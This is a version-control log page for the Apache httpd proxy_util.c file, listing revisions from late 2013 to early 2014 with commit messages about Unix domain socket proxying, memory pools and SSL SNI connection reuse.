([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1572627&r2=1572630&diff_format=h))
```
Redo what was reverted in [r1572627](/viewvc?view=revision&revision=1572627).
Don't reuse a SSL backend connection whose SNI differs. PR 55782.
This may happen when ProxyPreserveHost is on and the proxy-worker
handles connections to different Hosts.

```

---

Revision [**1572627**](/viewvc?view=revision&revision=1572627) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1572627&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1572627&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1572627))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1572627)

Modified
*Thu Feb 27 15:31:58 2014 UTC*
(10 years, 11 months ago)
by *ylavic*

File length: 122443 byte(s)

Diff to [previous 1572606](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1572606&r2=1572627)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1572606&r2=1572627&diff_format=h))
```
Revert [r1572606](/viewvc?view=revision&revision=1572606) for the time being since backport would conflict with 2.4.x's proxy_conn_rec.
The uds_path field is at the end of the struct in 2.4.x but not in trunk.
Fix that first, then recommit.

```

---

Revision [**1572606**](/viewvc?view=revision&revision=1572606) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1572606&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1572606&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1572606))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1572606)

Modified
*Thu Feb 27 14:52:12 2014 UTC*
(10 years, 11 months ago)
by *ylavic*

File length: 123514 byte(s)

Diff to [previous 1572561](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1572561&r2=1572606)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1572561&r2=1572606&diff_format=h))
```
Don't reuse a SSL backend connection whose SNI differs. PR 55782.
This may happen when ProxyPreserveHost is on and the proxy-worker
handles connections to different Hosts.

```

---

Revision [**1572561**](/viewvc?view=revision&revision=1572561) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1572561&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1572561&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1572561))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1572561)

Modified
*Thu Feb 27 13:39:25 2014 UTC*
(10 years, 11 months ago)
by *ylavic*

File length: 122443 byte(s)

Diff to [previous 1572543](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1572543&r2=1572561)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1572543&r2=1572561&diff_format=h))
```
Avoid useless functions calls.

```

---

Revision [**1572543**](/viewvc?view=revision&revision=1572543) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1572543&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1572543&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1572543))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1572543)

Modified
*Thu Feb 27 13:05:24 2014 UTC*
(10 years, 11 months ago)
by *ylavic*

File length: 122414 byte(s)

Diff to [previous 1564437](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1564437&r2=1572543)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1564437&r2=1572543&diff_format=h))
```
Cleanup the client to backend brigade before returning an error (if any) to avoid buckets lifetime issues (backend connection's pool destroyed before request's one). PR 50335.
Suggested by rpluem.

```

---

Revision [**1564437**](/viewvc?view=revision&revision=1564437) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1564437&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1564437&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1564437))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1564437)

Modified
*Tue Feb 4 19:36:50 2014 UTC*
(10 years, 11 months ago)
by *rpluem*

File length: 122307 byte(s)

Diff to [previous 1561660](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1561660&r2=1564437)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1561660&r2=1564437&diff_format=h))
```
* Do not parse URL in case of regular expression as they likely do not follow
  the URL syntax.

PR: 56074

```

---

Revision [**1561660**](/viewvc?view=revision&revision=1561660) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1561660&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1561660&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1561660))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1561660)

Modified
*Mon Jan 27 13:09:11 2014 UTC*
(11 years ago)
by *jim*

File length: 122264 byte(s)

Diff to [previous 1561137](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1561137&r2=1561660)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1561137&r2=1561660&diff_format=h))
```
r->filename should maintain the proxy: prefix for PHP-FPM

```

---

Revision [**1561137**](/viewvc?view=revision&revision=1561137) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1561137&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1561137&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1561137))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1561137)

Modified
*Fri Jan 24 20:01:47 2014 UTC*
(11 years ago)
by *jim*

File length: 122055 byte(s)

Diff to [previous 1560979](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1560979&r2=1561137)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1560979&r2=1561137&diff_format=h))
```
handle leak. thx to Y^2

```

---

Revision [**1560979**](/viewvc?view=revision&revision=1560979) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1560979&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1560979&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1560979))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1560979)

Modified
*Fri Jan 24 13:06:40 2014 UTC*
(11 years ago)
by *jim*

File length: 122133 byte(s)

Diff to [previous 1560689](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1560689&r2=1560979)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1560689&r2=1560979&diff_format=h))
```
Reflow logic... pull UDS stuff out

```

---

Revision [**1560689**](/viewvc?view=revision&revision=1560689) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1560689&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1560689&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1560689))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1560689)

Modified
*Thu Jan 23 14:09:40 2014 UTC*
(11 years ago)
by *jim*

File length: 121898 byte(s)

Diff to [previous 1560546](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1560546&r2=1560689)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1560546&r2=1560689&diff_format=h))
```
Tuck away UDS path in request-rec, since worker isn't
thread-safe. Protect from NULL refs.

```

---

Revision [**1560546**](/viewvc?view=revision&revision=1560546) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1560546&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1560546&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1560546))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1560546)

Modified
*Wed Jan 22 22:26:49 2014 UTC*
(11 years ago)
by *jim*

File length: 121749 byte(s)

Diff to [previous 1560367](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1560367&r2=1560546)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1560367&r2=1560546&diff_format=h))
```
Adjust url as required, following what we did to r->filename.
Save some cycles when searching...

```

---

Revision [**1560367**](/viewvc?view=revision&revision=1560367) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1560367&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1560367&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1560367))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1560367)

Modified
*Wed Jan 22 14:54:21 2014 UTC*
(11 years ago)
by *jim*

File length: 121372 byte(s)

Diff to [previous 1543174](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1543174&r2=1560367)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1543174&r2=1560367&diff_format=h))
```
make mod_rewrite and mod_proxy UDS work together...

```

---

Revision [**1543174**](/viewvc?view=revision&revision=1543174) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1543174&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1543174&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1543174))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1543174)

Modified
*Mon Nov 18 21:37:05 2013 UTC*
(11 years, 2 months ago)
by *jim*

File length: 120049 byte(s)

Diff to [previous 1542562](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1542562&r2=1543174)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1542562&r2=1543174&diff_format=h))
```
Correct logic... if this is a UDS socket, then bypass all
this.

```

---

Revision [**1542562**](/viewvc?view=revision&revision=1542562) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1542562&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1542562&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1542562))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1542562)

Modified
*Sat Nov 16 20:13:48 2013 UTC*
(11 years, 2 months ago)
by *jim*

File length: 120036 byte(s)

Diff to [previous 1540052](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1540052&r2=1542562)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1540052&r2=1542562&diff_format=h))
```
We were not being consistent between http and others
if we added the default port or not during the canonizing
phase... Baseline the http method (don't add unless the
port provided isn't the default).

```

---

Revision [**1540052**](/viewvc?view=revision&revision=1540052) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1540052&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1540052&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1540052))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1540052)

Modified
*Fri Nov 8 14:30:12 2013 UTC*
(11 years, 2 months ago)
by *jim*

File length: 119203 byte(s)

Diff to [previous 1533444](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533444&r2=1540052)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533444&r2=1540052&diff_format=h))
```
UDS urls need to be desockified when configuring...

```

---

Revision [**1533444**](/viewvc?view=revision&revision=1533444) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533444&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533444&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1533444))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1533444)

Modified
*Fri Oct 18 13:30:52 2013 UTC*
(11 years, 3 months ago)
by *rpluem*

File length: 119159 byte(s)

Diff to [previous 1533440](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533440&r2=1533444)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533440&r2=1533444&diff_format=h))
```
* Fix logical flaw introduced in [r1531340](/viewvc?view=revision&revision=1531340). We checked for the opposite.

```

---

Revision [**1533440**](/viewvc?view=revision&revision=1533440) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533440&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533440&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1533440))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1533440)

Modified
*Fri Oct 18 13:10:45 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 119145 byte(s)

Diff to [previous 1533272](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533272&r2=1533440)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533272&r2=1533440&diff_format=h))
```
Rüdiger and Yann suggestions

```

---

Revision [**1533272**](/viewvc?view=revision&revision=1533272) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533272&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533272&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1533272))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1533272)

Modified
*Thu Oct 17 22:04:31 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 119252 byte(s)

Diff to [previous 1533170](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533170&r2=1533272)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533170&r2=1533272&diff_format=h))
```
another suggestion by Yann... use a shorter lifetime pool

```

---

Revision [**1533170**](/viewvc?view=revision&revision=1533170) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533170&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533170&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1533170))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1533170)

Modified
*Thu Oct 17 17:21:37 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 119173 byte(s)

Diff to [previous 1533169](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533169&r2=1533170)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533169&r2=1533170&diff_format=h))
```
typo

```

---

Revision [**1533169**](/viewvc?view=revision&revision=1533169) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533169&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533169&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1533169))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1533169)

Modified
*Thu Oct 17 17:21:04 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 119172 byte(s)

Diff to [previous 1533153](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533153&r2=1533169)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533153&r2=1533169&diff_format=h))
```
from an idea by Yann Ylavic <ylavic.dev@gmail.com>

```

---

Revision [**1533153**](/viewvc?view=revision&revision=1533153) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533153&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533153&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1533153))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1533153)

Modified
*Thu Oct 17 16:52:04 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 119177 byte(s)

Diff to [previous 1533113](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533113&r2=1533153)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533113&r2=1533153&diff_format=h))
```
move pool creation to the single instance when we need it...
but be pool aware anyway, just in case.

```

---

Revision [**1533113**](/viewvc?view=revision&revision=1533113) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533113&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533113&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1533113))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1533113)

Modified
*Thu Oct 17 15:24:44 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 119251 byte(s)

Diff to [previous 1533100](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533100&r2=1533113)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533100&r2=1533113&diff_format=h))
```
Only assume localhost in the special case where the person
just has the lone scheme after the |

```

---

Revision [**1533100**](/viewvc?view=revision&revision=1533100) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533100&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533100&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1533100))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1533100)

Modified
*Thu Oct 17 15:02:04 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 119225 byte(s)

Diff to [previous 1533087](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533087&r2=1533100)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1533087&r2=1533100&diff_format=h))
```
ap_proxy_strncpy should correctly handle src being NULL.
Actually, apr_cpystrn() should as well...

```

---

Revision [**1533087**](/viewvc?view=revision&revision=1533087) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533087&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1533087&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1533087))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1533087)

Modified
*Thu Oct 17 14:10:43 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 119079 byte(s)

Diff to [previous 1532507](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1532507&r2=1533087)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1532507&r2=1533087&diff_format=h))
```
Put the uds path in its own field, and adjust the logic
to look for an empty string rather than a flag.

```

---

Revision [**1532507**](/viewvc?view=revision&revision=1532507) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1532507&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1532507&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1532507))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1532507)

Modified
*Tue Oct 15 20:02:30 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 119123 byte(s)

Diff to [previous 1532456](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1532456&r2=1532507)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1532456&r2=1532507&diff_format=h))
```
don't use what could have been freed...

```

---

Revision [**1532456**](/viewvc?view=revision&revision=1532456) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1532456&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1532456&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1532456))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1532456)

Modified
*Tue Oct 15 17:45:47 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 119124 byte(s)

Diff to [previous 1532394](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1532394&r2=1532456)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1532394&r2=1532456&diff_format=h))
```
Update LOGNO

```

---

Revision [**1532394**](/viewvc?view=revision&revision=1532394) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1532394&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1532394&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1532394))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1532394)

Modified
*Tue Oct 15 15:38:09 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 119114 byte(s)

Diff to [previous 1531971](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1531971&r2=1532394)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1531971&r2=1532394&diff_format=h))
```
Standardize on:

   unix:/path/to/socket|scheme://ignored

for ProxyPass UDS.

```

---

Revision [**1531971**](/viewvc?view=revision&revision=1531971) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1531971&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1531971&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1531971))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1531971)

Modified
*Mon Oct 14 16:38:52 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 118982 byte(s)

Diff to [previous 1531969](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1531969&r2=1531971)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1531969&r2=1531971&diff_format=h))
```
check that we have a pool...

```

---

Revision [**1531969**](/viewvc?view=revision&revision=1531969) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1531969&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1531969&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1531969))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1531969)

Modified
*Mon Oct 14 16:31:17 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 118836 byte(s)

Diff to [previous 1531962](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1531962&r2=1531969)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1531962&r2=1531969&diff_format=h))
```
Just use the def global... consistency is important

```

---

Revision [**1531962**](/viewvc?view=revision&revision=1531962) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1531962&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1531962&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1531962))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1531962)

Modified
*Mon Oct 14 16:12:30 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 118861 byte(s)

Diff to [previous 1531929](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1531929&r2=1531962)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1531929&r2=1531962&diff_format=h))
```
Ensure that userland format of UDS is the same as how it is
configured, no matter how we store and use it internally.

```

---

Revision [**1531929**](/viewvc?view=revision&revision=1531929) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1531929&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1531929&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1531929))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1531929)

Modified
*Mon Oct 14 14:59:38 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 118331 byte(s)

Diff to [previous 1531370](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1531370&r2=1531929)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1531370&r2=1531929&diff_format=h))
```
clean up socket definition... just the sock: path matters,
and we adjust relative to DefaultRuntimeDir

```

---

Revision [**1531370**](/viewvc?view=revision&revision=1531370) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1531370&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1531370&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1531370))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1531370)

Modified
*Fri Oct 11 17:36:24 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 118203 byte(s)

Diff to [previous 1531340](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1531340&r2=1531370)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1531340&r2=1531370&diff_format=h))
```
syntax sugar... if the worker is associated w/ a UDS,
then make sure the log reporting has a visual clue.

```

---

Revision [**1531340**](/viewvc?view=revision&revision=1531340) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1531340&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1531340&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1531340))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1531340)

Modified
*Fri Oct 11 16:12:41 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 117930 byte(s)

Diff to [previous 1530813](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1530813&r2=1531340)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1530813&r2=1531340&diff_format=h))
```
Reformat the UDS support inline with a new naming structure.
Use a flag for speed for testing.

```

---

Revision [**1530813**](/viewvc?view=revision&revision=1530813) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1530813&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1530813&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1530813))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1530813)

Modified
*Wed Oct 9 22:22:17 2013 UTC*
(11 years, 3 months ago)
by *jim*

File length: 117335 byte(s)

Diff to [previous 1530792](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1530792&r2=1530813)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1530792&r2=1530813&diff_format=h))
```
save a possible lookup

```

---

Revision [**1530792**](/viewvc?view=revision&revision=1530792) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1530792&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1530792&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1530792))
